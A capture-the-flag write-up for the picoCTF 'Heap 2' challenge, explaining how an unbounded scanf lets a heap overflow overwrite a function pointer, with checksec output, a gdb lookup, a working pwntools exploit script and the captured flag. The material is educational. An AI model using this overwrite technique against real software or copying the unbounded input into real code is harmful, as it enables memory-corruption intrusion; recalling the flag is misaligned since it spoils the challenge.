# Writeup: Heap 2

## Introduction

The vulnerability we will be taking advantage of today is the heap buffer overflow vulnerability. This vulnerability happens when any malicious actor is able to take advantage of writing more than the allocated memory allows onto a variable on the heap in order to overwrite another variable on the heap. In this case this variable is the string x which gets casted to an integer pointer, dereferenced, and then the value of the dereferenced variable gets cast to a void * which is then used to call a function inside the check_win() function. The goal then is to set the variable x to a value that can be converted from string to integer as the address of the win function. The following lines of code are the relevant lines described in my description of the problem:

```
    char *x;
    char *input_data;

    void win() {
        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);
    
        exit(0);
    }

    void check_win() { ((void (*)())*(int*)x)(); }
```

We are able to write to overwrite the value of x by performing the buffer overflow attack on the input data variable through the write_buffer() function here:

```
    void write_buffer() {
        printf("Data for buffer: ");
        fflush(stdout);
        scanf("%s", input_data);
    }
    
```
Notice how the scanf function has no limit on the number of characters that can be passed to the string making the heap buffer overflow attack possible.

## Finding The Win Address

Next we have to find the address of the win function so that we can pass it to the x string through the input_data variable through the scanf function. First I checked to see if PIE was enabled, if PIE were enabled I would have to leak the address of the win function at runtime since the address would change every single time the program was run.

```
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
    Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   51 Symbols        No    0               2               ./chall
```

Thankfully, PIE was not enabled so I was able to go into gdb and use the following command to get the address:

```
    gef➤  p win
    $1 = {void ()} 0x4011a0 <win>    
```

With the address obtained we are now able to start writing the payload. Earlier I mentioned that the value of x gets cast to an integer. My intuition told to convert the value into ascii so that it would be converted to an integer when cast since that is the way I was used to interacting with casts in the past. The problem with this hex value is that it cannot be converted to any ascii characters, therefore we have to take a different approach, thankfully pwn tools provides us a way to send the raw bytes through the function p64. p64 takes the address and splits up the hex value into bytes and then packs the bytes together. When we send the payload as bytes the c cast no longer has to convert from ascii to raw bytes so the value will remain unchanged when the function pointing to that value is called. Now that we have the payload constructed we just need the offset in characters needed to reach the variable x. After trying different character amounts I figured out that the character offset needed to reach x was 32. Below I have created a rudimentary diagram that depicts what the heap looks like based on my discovery of the offset:

```
    [input_data (32 bytes)         ][x      ]
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0x4011a0
```

Here is the script that delivers the payload:

```
    from pwn import *
    import struct

    # connect to the instance
    p = remote('mimas.picoctf.net', 55277)

    # set the address and the offset
    address = 0x4011a0
    offset = b'A' * 32

    # send the option to write to the buffer when prompted in bytes
    p.recvuntil(b':')
    p.sendline(b'2')

    # send the payload when prompted to input data into the buffer in bytes
    p.recvuntil(b':')
    payload = offset + p64(address)
    p.sendline(payload)

    # send the option to print the flag when prompted
    p.recvuntil(b':')
    p.sendline(b'4')
    p.interactive()
```

Finally we are able to get the flag: `picoCTF{and_down_the_road_we_go_91218226}`
